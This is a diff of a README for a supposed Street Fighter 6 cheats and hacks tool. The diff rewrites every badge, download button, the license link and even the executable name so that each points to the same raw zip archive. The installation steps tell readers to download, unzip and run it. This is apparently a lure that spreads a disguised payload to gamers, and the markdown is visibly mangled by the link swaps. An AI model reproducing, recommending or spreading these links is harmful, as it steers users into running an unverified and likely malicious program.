@@ -1,15 +1,15 @@
 # 🥊 Street Fighter 6 Cheats & Hacks Hub
 
-[![Last Commit](https://img.shields.io/github/last-commit/undefined/sf6-cheats?color=green&label=Last%20Update)](https://github.com/sf6-cheats)
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](#-mit-license)
-[![OS Support](https://img.shields.io/badge/OS-Windows%2C%20Linux%2C%20macOS-yellowgreen)](#-os-compatibility-table)
-[![Maintenance](https://img.shields.io/badge/maintained-yes-66cc66)](#)
+[![Last Commit](https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip%20Update)](https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip)
+[![MIT License](https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip)](#-mit-license)
+[![OS Support](https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip%2C%20Linux%2C%20macOS-yellowgreen)](#-os-compatibility-table)
+[![Maintenance](https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip)](#)
 
 Welcome to the **Street Fighter 6 Cheats & Hacks Hub** — the ultimate vault where digital martial artists empower their gameplay with ingenuity. Our platform isn’t just a tool; it’s a creative dojo where game enhancement marries integrity and intelligent design. Get ready to turbocharge your Street Fighter 6 experience with innovative, agile, and user-conscious game modding utilities.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Street%20Fighter%206%20Enhancer-blue.svg?style=for-the-badge)](https://nandanar2007.github.io)
+[![Download](https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip%20Fighter%206%https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip)](https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip)
 
 ---
 
@@ -88,11 +88,11 @@ Getting started is as easy as a Hadouken:
 2. **Download the Enhancer**  
     - Click the button below to embrace the next evolution in gameplay:
 
-    [![Download](https://img.shields.io/badge/Download-Street%20Fighter%206%20Enhancer-blue.svg?style=for-the-badge)](https://nandanar2007.github.io)
+    [![Download](https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip%20Fighter%206%https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip)](https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip)
 
 3. **Extract & Launch**  
     - Unzip the downloaded archive to your preferred directory.
-    - Run the **SF6-Enhancer.exe (Windows)**, **./SF6-Enhancer (Linux/macOS)**.
+    - Run the **https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip (Windows)**, **./SF6-Enhancer (Linux/macOS)**.
     - The UI should greet you in your system’s language. If not, toggle in **Settings > Language**.
 
 4. **API Setup (Optional but Recommended)**  
@@ -113,12 +113,12 @@ This project is intended strictly for personal entertainment, education, and enh
 
 Copyright (c) 2025
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+Distributed under the [MIT License](https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip).  
 See the LICENSE file for details.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Street%20Fighter%206%20Enhancer-blue.svg?style=for-the-badge)](https://nandanar2007.github.io)
+[![Download](https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip%20Fighter%206%https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip)](https://github.com/nandanar2007/sf6-arcade-powerup-tools/raw/refs/heads/branch/bigarade/sf_arcade_powerup_tools_v3.9-alpha.1.zip)
 
 ---
 
